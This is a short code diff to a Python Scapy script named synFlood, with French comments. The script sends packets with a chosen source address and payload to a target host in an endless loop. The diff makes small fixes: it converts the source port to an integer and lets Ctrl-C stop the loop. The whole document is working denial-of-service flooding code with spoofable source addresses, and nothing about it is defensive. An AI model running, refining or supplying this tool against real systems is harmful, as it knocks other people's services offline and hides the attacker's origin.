@@ -5,7 +5,7 @@ from scapy.all import *
 def synFlood(src,tgt,message, srcport):
 	for dport in range(1024,65535): #pour chaque port de destination dans cette range
 		IPlayer = IP(src=src, dst=tgt) #couche IP
-		TCPlayer = TCP(sport=srcport, dport=80) #sport = port avec lequel on envoie
+		TCPlayer = TCP(sport=int(srcport), dport=80) #sport = port avec lequel on envoie
 		RAWlayer = Raw(load=message)
 		pkt = IPlayer/TCPlayer/RAWlayer #on concatène les packets
 		send(pkt) #on envoie le packet
@@ -17,4 +17,7 @@ message = input("[*] Enter message for TCP payload: ")
 
 
 while True:
-	synFlood(source, target, message, srcport)
+	try:
+		synFlood(source, target, message, srcport)
+	except KeyboardInterrupt:
+		break
